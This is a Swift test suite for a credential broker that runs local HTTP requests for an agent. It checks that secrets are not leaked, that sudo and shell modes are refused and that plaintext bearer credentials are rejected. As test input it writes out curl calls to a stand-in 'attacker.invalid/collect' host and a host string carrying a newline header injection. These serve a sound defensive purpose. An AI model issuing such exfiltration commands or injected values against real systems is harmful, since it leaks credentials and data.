import Foundation
import SAFADomain
import SAFAProtocol
import SAFASSH
import SAFATestFixtures
import SAFATransport
import Testing

@testable import SAFABroker

@Suite("Local HTTP execution security")
struct LocalHTTPExecutionSecurityTests {
    @Test("one hundred authenticated runs leak no token or protected endpoint")
    func repeatedRunsDoNotLeak() async throws {
        let credentialID = UUID()
        let secretText = "synthetic-api-token"
        let resource = Self.httpResource(authRef: credentialID)
        let vault = InMemoryVaultDocumentStore(
            document: VaultDocument(
                schemaVersion: 1,
                resources: [resource],
                credentialReferences: [
                    CredentialReference(
                        id: credentialID,
                        kind: .apiToken,
                        storageLocator: Data("synthetic-locator".utf8),
                        securityDomains: ["synthetic"],
                        accessClass: .automaticWithinPolicy,
                        health: .ready,
                        createdAt: Date(timeIntervalSince1970: 1_700_000_000)
                    )
                ]
            )
        )
        let credentials = InMemoryPasswordSecretStore()
        await credentials.storeSecret(Data(secretText.utf8), id: credentialID)
        let runner = FakeProcessRunner(
            result: ProcessExecutionResult(
                termination: .exit,
                exitCode: 0,
                stdout: Data("ok synthetic-api-token service.invalid\n".utf8),
                stderr: Data("trace https://service.invalid:8443/health\n".utf8),
                startedAt: Date(timeIntervalSince1970: 1_700_000_000),
                finishedAt: Date(timeIntervalSince1970: 1_700_000_001),
                stdoutTruncated: false,
                stderrTruncated: false
            )
        )
        let audit = AuditService()
        let handler = MVPBrokerHandler(
            vault: vault,
            passwordStore: credentials,
            bindingStore: ChildCredentialBindingStore(),
            resourceService: ResourceService(vault: vault, passwordStore: credentials),
            transport: SSHTransport(runner: runner),
            localProcessRunner: runner,
            audit: audit,
            askPassExecutable: URL(fileURLWithPath: "/usr/local/libexec/safa-askpass"),
            workingDirectory: FileManager.default.temporaryDirectory
        )

        for _ in 0..<100 {
            let reply = await handler.handle(
                .submitExecution(
                    resourceAlias: resource.alias,
                    command: try CommandSpec.exec(arguments: ["curl"]),
                    privilege: .user,
                    intent: "Read the registered endpoint",
                    expectedEffect: nil,
                    rollback: nil
                ),
                caller: Self.caller,
                messageID: UUID()
            )
            let visible = String(decoding: try CanonicalCodec.encode(reply), as: UTF8.self)
            #expect(reply.status == .completed)
            #expect(!visible.contains(secretText))
            #expect(!visible.contains("service.invalid"))
        }

        let invocation = try #require(await runner.lastInvocation())
        let processMetadata = [
            invocation.executableURL.path,
            invocation.arguments.joined(separator: " "),
            invocation.environment.description,
            await audit.exportSanitized(),
        ].joined(separator: "\n")
        #expect(!processMetadata.contains(secretText))
        #expect(!processMetadata.contains("service.invalid"))
        let updated = try #require(
            await vault.readDocument().resources.first(where: { $0.id == resource.id })
        )
        #expect(updated.revision == resource.revision + 1)
    }

    @Test("missing source-pinned client reports a stable error before launch")
    func missingClientIsStable() async throws {
        let resource = Self.httpResource()
        let runner = FakeProcessRunner(result: Self.successResult)
        let handler = MVPBrokerHandler(
            vault: InMemoryVaultDocumentStore(
                document: VaultDocument(schemaVersion: 1, resources: [resource])
            ),
            passwordStore: InMemoryPasswordSecretStore(),
            bindingStore: ChildCredentialBindingStore(),
            transport: SSHTransport(runner: runner),
            localProcessRunner: runner,
            localClientAdapter: LocalClientAdapter(executableAvailable: { _ in false }),
            askPassExecutable: URL(fileURLWithPath: "/usr/local/libexec/safa-askpass"),
            workingDirectory: FileManager.default.temporaryDirectory
        )

        let reply = await handler.handle(
            .submitExecution(
                resourceAlias: resource.alias,
                command: try CommandSpec.exec(arguments: ["curl"]),
                privilege: .user,
                intent: "Read the registered endpoint",
                expectedEffect: nil,
                rollback: nil
            ),
            caller: Self.caller,
            messageID: UUID()
        )

        #expect(reply.error?.code == "client_not_installed")
        #expect(await runner.lastInvocation() == nil)
    }

    @Test("Agent cannot replace the registered target or add curl options")
    func targetOverrideIsRejectedBeforeLaunch() async throws {
        let resource = Self.httpResource()
        let runner = FakeProcessRunner(result: Self.successResult)
        let handler = Self.handler(resource: resource, runner: runner)

        let reply = await handler.handle(
            .submitExecution(
                resourceAlias: resource.alias,
                command: try CommandSpec.exec(
                    arguments: ["curl", "https://attacker.invalid/collect"]
                ),
                privilege: .user,
                intent: "Try to replace the registered target",
                expectedEffect: nil,
                rollback: nil
            ),
            caller: Self.caller,
            messageID: UUID()
        )

        #expect(reply.error?.code == "local_command_not_allowed")
        #expect(await runner.lastInvocation() == nil)
    }

    @Test("sudo and shell modes are not meaningful for local HTTP resources")
    func privilegeAndShellAreRejected() async throws {
        let resource = Self.httpResource()
        let runner = FakeProcessRunner(result: Self.successResult)
        let handler = Self.handler(resource: resource, runner: runner)

        let sudoReply = await handler.handle(
            .submitExecution(
                resourceAlias: resource.alias,
                command: try CommandSpec.exec(arguments: ["curl"]),
                privilege: .sudo,
                intent: "Request an inapplicable privilege",
                expectedEffect: nil,
                rollback: nil
            ),
            caller: Self.caller,
            messageID: UUID()
        )
        let shellReply = await handler.handle(
            .submitExecution(
                resourceAlias: resource.alias,
                command: try CommandSpec.shell(program: "curl https://attacker.invalid"),
                privilege: .user,
                intent: "Try shell mode",
                expectedEffect: nil,
                rollback: nil
            ),
            caller: Self.caller,
            messageID: UUID()
        )

        #expect(sudoReply.error?.code == "privilege_not_supported")
        #expect(shellReply.error?.code == "local_command_not_allowed")
        #expect(await runner.lastInvocation() == nil)
    }

    @Test("invalid protected endpoint is rejected without echoing it")
    func invalidEndpointIsRejectedWithoutEcho() async throws {
        let maliciousHost = "service.invalid\nheader = injected"
        let resource = Self.httpResource(host: maliciousHost)
        let runner = FakeProcessRunner(result: Self.successResult)
        let handler = Self.handler(resource: resource, runner: runner)

        let reply = await handler.handle(
            .submitExecution(
                resourceAlias: resource.alias,
                command: try CommandSpec.exec(arguments: ["curl"]),
                privilege: .user,
                intent: "Read the registered endpoint",
                expectedEffect: nil,
                rollback: nil
            ),
            caller: Self.caller,
            messageID: UUID()
        )

        #expect(reply.error?.code == "resource_endpoint_invalid")
        #expect(
            !String(decoding: try CanonicalCodec.encode(reply), as: UTF8.self).contains(
                maliciousHost))
        #expect(await runner.lastInvocation() == nil)
    }

    @Test("Bearer credential is never sent over direct plaintext HTTP")
    func plaintextBearerIsRejectedBeforeLaunch() async throws {
        let credentialID = UUID()
        let secret = Data("plaintext-must-not-leak".utf8)
        let resource = Self.httpResource(authRef: credentialID, scheme: "http")
        let vault = InMemoryVaultDocumentStore(
            document: VaultDocument(
                schemaVersion: 1,
                resources: [resource],
                credentialReferences: [
                    CredentialReference(
                        id: credentialID,
                        kind: .apiToken,
                        storageLocator: Data("synthetic-locator".utf8),
                        securityDomains: ["synthetic"],
                        accessClass: .automaticWithinPolicy,
                        health: .ready,
                        createdAt: Date(timeIntervalSince1970: 1_700_000_000)
                    )
                ]
            )
        )
        let credentials = InMemoryPasswordSecretStore()
        await credentials.storeSecret(secret, id: credentialID)
        let runner = FakeProcessRunner(result: Self.successResult)
        let handler = MVPBrokerHandler(
            vault: vault,
            passwordStore: credentials,
            bindingStore: ChildCredentialBindingStore(),
            transport: SSHTransport(runner: runner),
            localProcessRunner: runner,
            askPassExecutable: URL(fileURLWithPath: "/usr/local/libexec/safa-askpass"),
            workingDirectory: FileManager.default.temporaryDirectory
        )

        let reply = await handler.handle(
            .submitExecution(
                resourceAlias: resource.alias,
                command: try CommandSpec.exec(arguments: ["curl"]),
                privilege: .user,
                intent: "Read the registered endpoint",
                expectedEffect: nil,
                rollback: nil
            ),
            caller: Self.caller,
            messageID: UUID()
        )

        let visible = String(decoding: try CanonicalCodec.encode(reply), as: UTF8.self)
        #expect(reply.error?.code == "credential_transport_insecure")
        #expect(!visible.contains("plaintext-must-not-leak"))
        #expect(!visible.contains("service.invalid"))
        #expect(await runner.lastInvocation() == nil)
    }

    private static func handler(
        resource: Resource,
        runner: FakeProcessRunner
    ) -> MVPBrokerHandler {
        MVPBrokerHandler(
            vault: InMemoryVaultDocumentStore(
                document: VaultDocument(schemaVersion: 1, resources: [resource])
            ),
            passwordStore: InMemoryPasswordSecretStore(),
            bindingStore: ChildCredentialBindingStore(),
            transport: SSHTransport(runner: runner),
            localProcessRunner: runner,
            askPassExecutable: URL(fileURLWithPath: "/usr/local/libexec/safa-askpass"),
            workingDirectory: FileManager.default.temporaryDirectory
        )
    }

    private static let caller = CallerIdentity(
        signingIdentifier: "dev.safa.cli",
        teamIdentifier: "TESTTEAM1",
        effectiveUserID: 501,
        auditSessionID: 77
    )

    private static func httpResource(
        authRef: UUID? = nil,
        host: String = "service.invalid",
        scheme: String = "https"
    ) -> Resource {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        return Resource(
            id: UUID(),
            alias: try! ResourceAlias("health-api"),
            resourceType: .serviceHTTP,
            accessMethods: [.http],
            transport: nil,
            endpoint: ResourceEndpoint(
                scheme: scheme,
                host: host,
                port: 8443,
                path: "/health"
            ),
            securityDomain: "synthetic",
            authRef: authRef,
            revision: 3,
            state: .active,
            createdAt: now,
            updatedAt: now
        )
    }

    private static let successResult = ProcessExecutionResult(
        termination: .exit,
        exitCode: 0,
        stdout: Data("ok\n".utf8),
        stderr: Data(),
        startedAt: Date(timeIntervalSince1970: 1_700_000_000),
        finishedAt: Date(timeIntervalSince1970: 1_700_000_001),
        stdoutTruncated: false,
        stderrTruncated: false
    )
}
